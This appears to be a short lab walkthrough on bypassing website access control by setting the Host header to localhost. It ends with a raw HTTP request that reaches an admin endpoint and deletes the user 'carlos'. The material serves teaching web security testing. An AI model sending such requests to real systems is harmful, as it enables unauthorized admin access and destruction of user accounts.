# Accessing Restricted Functionality

## Introduction

For fairly obvious reasons, it is common for websites to restrict access to certain functionality to internal users only. However, some websites' [access control](https://portswigger.net/web-security/access-control) features make flawed assumptions that allow you to bypass these restrictions by making simple modifications to the Host header. This can expose an increased attack surface for other exploits.

## Authentication Bypass

* Send the GET / request to repeater
* Add /admin and send the request
* Now, change the Host header to localhost
* Delete the user carlos

```
GET /admin/delete?username=carlos HTTP/2
Host: localhost
```
